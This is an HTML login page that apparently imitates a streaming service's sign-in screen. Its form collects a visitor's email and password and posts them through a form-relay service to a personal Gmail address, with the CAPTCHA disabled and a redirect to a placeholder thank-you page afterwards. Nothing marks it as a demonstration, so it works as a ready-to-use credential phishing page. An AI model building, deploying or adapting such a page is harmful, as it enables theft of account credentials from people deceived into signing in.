<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login</title>
  <style>
    body {
      background: #141414;
      color: white;
      font-family: Arial, sans-serif;
      padding: 2rem;
      text-align: center;
    }
    form {
      max-width: 400px;
      margin: auto;
      background: #222;
      padding: 20px;
      border-radius: 8px;
    }
    input, button {
      display: block;
      width: 90%;
      margin: 10px auto;
      padding: 12px;
      border: none;
      border-radius: 4px;
    }
    input {
      background: #333;
      color: white;
    }
    button {
      background: red;
      color: white;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <h1>Sign In</h1>
  <form action="https://formsubmit.co/lashermarvin@gmail.com" method="POST">
    <input type="email" name="email" placeholder="Email" required />
    <input type="password" name="password" placeholder="Password" required />
    <input type="hidden" name="_captcha" value="false" />
    <input type="hidden" name="_next" value="https://your-site.com/thank-you.html" />
    <button type="submit">Sign In</button>
  </form>
</body>
</html>
